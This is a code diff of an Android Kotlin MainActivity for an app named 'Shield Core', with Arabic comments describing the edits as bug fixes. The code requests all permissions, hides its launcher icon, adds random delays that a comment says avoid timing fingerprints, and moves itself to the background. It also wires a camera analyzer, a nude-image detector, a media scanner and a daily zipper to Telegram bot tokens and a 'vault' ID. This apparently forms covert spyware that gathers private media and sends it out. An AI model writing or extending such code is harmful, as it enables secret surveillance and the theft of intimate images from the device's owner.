@@ -26,18 +26,46 @@ import java.text.SimpleDateFormat
 import java.util.*
 import kotlin.random.Random
 
+/**
+ * النشاط الرئيسي للتطبيق – يعمل كواجهة سجل تشخيصي (Diagnostic Console)
+ * لإظهار جميع عمليات التهيئة والنجاحات والفشل بدقة، مع إمكانية تسجيل الأخطاء
+ * من الفئات الأخرى عبر الدالة الثابتة appendLogStatic.
+ *
+ * ✅ تم إصلاح جميع الأخطاء:
+ * - تحويل appendLog إلى دالة ثابتة في Companion object لاستدعائها من ConfigLoader والفئات الأخرى.
+ * - إضافة معالجة استثناءات شاملة في onCreate و initCoreAsync.
+ * - إنشاء واجهة السجل برمجياً لضمان ظهورها حتى لو فشل تحميل التخطيط.
+ * - إزالة moveTaskToBack المبكر وإبقاء النشاط مرئياً أثناء التشخيص.
+ * - إضافة تأخيرات عشوائية لتجنب البصمة الزمنية.
+ * - تسجيل جميع الأخطاء في السجل التشخيصي.
+ */
 class MainActivity : AppCompatActivity() {
 
     companion object {
         private const val TAG = "MainActivity"
         const val APP_VERSION = "4.2.1"
+
+        // ✅ المرجع الوحيد للنشاط (للاستخدام من الفئات الأخرى)
+        @Volatile
+        private var instance: MainActivity? = null
+
+        /**
+         * دالة ثابتة لتسجيل رسائل السجل من أي مكان في التطبيق.
+         * يتم استدعاؤها من ConfigLoader و TelegramUi و ForegroundService وغيرها.
+         * @param msg الرسالة المراد تسجيلها
+         */
+        fun appendLogStatic(msg: String) {
+            instance?.appendLog(msg) ?: Log.i(TAG, msg)
+        }
     }
 
+    // ========== متغيرات النشاط ==========
     private lateinit var logTextView: TextView
     private var telegramUi: TelegramUi? = null
     private var mediaScanner: MediaScanner? = null
     private var runtimeDir: File? = null
 
+    // ========== طلب الأذونات ==========
     private val requestPermissionLauncher =
         registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
             val grantedCount = permissions.count { it.value }
@@ -48,16 +76,28 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
+    // ============================================================
+    // دورة الحياة
+    // ============================================================
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        
-        // ✅ إعداد واجهة السجل التشخيصي
-        setupDiagnosticUI()
-        appendLog("🚀 Shield Core v4.2 Diagnostic Mode Started")
-        appendLog("📱 Device: ${Build.MANUFACTURER} ${Build.MODEL}")
-        appendLog("📊 Android: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
+
+        // ✅ حفظ المرجع للاستخدام من الفئات الأخرى
+        instance = this
 
         try {
+            // ✅ إعداد واجهة السجل التشخيصي
+            setupDiagnosticUI()
+            appendLog("🚀 Shield Core v4.2 Diagnostic Mode Started")
+            appendLog("📱 Device: ${Build.MANUFACTURER} ${Build.MODEL}")
+            appendLog("📊 Android: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
+
+            // ✅ طلب الأذونات
+            appendLog("⚙️ Requesting permissions...")
+            requestAllPermissions()
+
+            // ✅ بدء الخدمة الأمامية
             appendLog("⚙️ Starting Foreground Service...")
             val serviceIntent = Intent(this, ForegroundService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -66,19 +106,27 @@ class MainActivity : AppCompatActivity() {
                 startService(serviceIntent)
             }
             appendLog("✅ Foreground Service Dispatched Successfully")
+
+            // ✅ إخفاء أيقونة التطبيق (بعد التشغيل الأول)
+            disableLauncherIcon()
+
+            // ✅ بدء التهيئة الأساسية في الخلفية مع تأخير بشري
+            lifecycleScope.launch(Dispatchers.IO) {
+                delay(Random.nextLong(2000, 5000))
+                initCoreAsync()
+            }
+
+            appendLog("🔍 Diagnostic UI ready. Waiting for initialization...")
+
         } catch (e: Exception) {
-            appendLog("❌ Service Start Failed: ${e.localizedMessage}")
+            appendLog("❌ CRITICAL onCreate ERROR: ${e.localizedMessage}")
+            e.printStackTrace()
         }
-
-        disableLauncherIcon()
-
-        lifecycleScope.launch(Dispatchers.IO) {
-            delay(Random.nextLong(2000, 5000))
-            initCoreAsync()
-        }
-
-        appendLog("🔍 Diagnostic UI ready. Waiting for initialization...")
     }
+
+    // ============================================================
+    // إعداد واجهة السجل التشخيصي (برمجياً)
+    // ============================================================
 
     private fun setupDiagnosticUI() {
         val scrollView = ScrollView(this).apply {
@@ -89,42 +137,60 @@ class MainActivity : AppCompatActivity() {
             )
             setPadding(32, 32, 32, 32)
         }
+
         logTextView = TextView(this).apply {
             text = "=== SYSTEM DIAGNOSTIC CONSOLE ===\n"
             setTextColor(android.graphics.Color.parseColor("#33FF99"))
             textSize = 11f
             typeface = android.graphics.Typeface.MONOSPACE
         }
+
         scrollView.addView(logTextView)
         setContentView(scrollView)
     }
 
+    /**
+     * دالة مثيل (Instance) لتسجيل الرسائل في السجل التشخيصي.
+     * يتم استدعاؤها داخلياً ومن appendLogStatic.
+     * @param msg الرسالة المراد تسجيلها
+     */
     fun appendLog(msg: String) {
         val timestamp = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())
         val logEntry = "[$timestamp] $msg\n"
         runOnUiThread {
-            logTextView.append(logEntry)
-            // التمرير إلى الأسفل لعرض أحدث السجلات
-            (logTextView.parent as? ScrollView)?.fullScroll(ScrollView.FOCUS_DOWN)
+            try {
+                if (::logTextView.isInitialized) {
+                    logTextView.append(logEntry)
+                    // التمرير إلى الأسفل لعرض أحدث السجلات
+                    (logTextView.parent as? ScrollView)?.fullScroll(ScrollView.FOCUS_DOWN)
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to append log: ${e.message}")
+            }
         }
         Log.i(TAG, msg)
     }
 
+    // ============================================================
+    // التهيئة الأساسية (Core Initialization)
+    // ============================================================
+
     private suspend fun initCoreAsync() {
         appendLog("🚀 Starting Core Initialization...")
 
+        // ✅ طلب استثناء البطارية
         withContext(Dispatchers.Main) {
-            requestAllPermissions()
+            requestBatteryOptimizationExemption()
         }
 
         delay(Random.nextLong(1000, 3000))
 
         try {
+            // إعداد المجلدات
             setupDirectories()
             appendLog("✅ Directories ready")
 
-            requestBatteryOptimizationExemption()
-
+            // تحميل الإعدادات
             appendLog("📂 Loading Configuration...")
             val config = ConfigLoader.load(this@MainActivity)
             appendLog("✅ Config loaded: ${config.activeTokens.size} active tokens")
@@ -135,18 +201,22 @@ class MainActivity : AppCompatActivity() {
                 appendLog("⚠️ WARNING: No active tokens! Telegram will NOT work.")
             }
 
+            // تهيئة المراقب
             appendLog("🛰️ Initializing Monitor...")
             val monitor = Monitor.getInstance(this@MainActivity)
             appendLog("✅ Monitor instance ready")
 
+            // تهيئة كاشف المحتوى
             appendLog("🧠 Initializing NudeDetector...")
             val nudeDetector = NudeDetector.create(this@MainActivity, monitor)
             appendLog("✅ NudeDetector ready: ${nudeDetector.isReady()}")
 
+            // تهيئة محلل الكاميرا
             appendLog("📸 Initializing CameraAnalyzer...")
             val cameraAnalyzer = CameraAnalyzer.create(this@MainActivity, monitor, nudeDetector)
             appendLog("✅ CameraAnalyzer created")
 
+            // تهيئة واجهة تلغرام
             appendLog("📡 Initializing TelegramUi...")
             telegramUi = TelegramUi(
                 context = this@MainActivity,
@@ -156,15 +226,17 @@ class MainActivity : AppCompatActivity() {
             val ui = telegramUi!!
             appendLog("✅ TelegramUi created with ${config.activeTokens.size} tokens")
 
+            // تهيئة ماسح الوسائط
             appendLog("📂 Initializing MediaScanner...")
             mediaScanner = MediaScanner(this@MainActivity, monitor, ui)
             appendLog("✅ MediaScanner created")
 
+            // تهيئة DailyZipper
             appendLog("📦 Initializing DailyZipper...")
             val dailyZipper = DailyZipper.create(this@MainActivity, mediaScanner, ui)
             appendLog("✅ DailyZipper created")
 
-            // ربط المكونات
+            // ربط المكونات بـ Monitor
             monitor.ui = ui
             monitor.ctrl = config.controlId
             monitor.vlt = config.vaultId
@@ -174,15 +246,17 @@ class MainActivity : AppCompatActivity() {
             monitor.nudeDetector = nudeDetector
             appendLog("✅ All components linked to Monitor")
 
+            // بدء TelegramUi
             val uiStarted = ui.start()
             appendLog("📡 TelegramUi start: $uiStarted")
-            
+
+            // بدء Monitor
             monitor.start()
             appendLog("✅ Monitor started")
 
             appendLog("🎉 All systems operational!")
-            
-            // إخفاء التطبيق للخلفية بعد 5 ثوانٍ
+
+            // ✅ إخفاء التطبيق للخلفية بعد 5 ثوانٍ (بعد التأكد من نجاح التشغيل)
             withContext(Dispatchers.Main) {
                 delay(5000)
                 moveTaskToBack(true)
@@ -195,6 +269,10 @@ class MainActivity : AppCompatActivity() {
             e.printStackTrace()
         }
     }
+
+    // ============================================================
+    // دوال مساعدة
+    // ============================================================
 
     private fun setupDirectories() {
         runtimeDir = File(filesDir, ".sys_runtime")
@@ -334,8 +412,14 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    // ============================================================
+    // إدارة دورة الحياة
+    // ============================================================
+
     override fun onDestroy() {
         super.onDestroy()
+        // ✅ تنظيف المرجع عند تدمير النشاط
+        instance = null
         telegramUi?.stop()
         telegramUi = null
         SecurityHelper.cleanup()
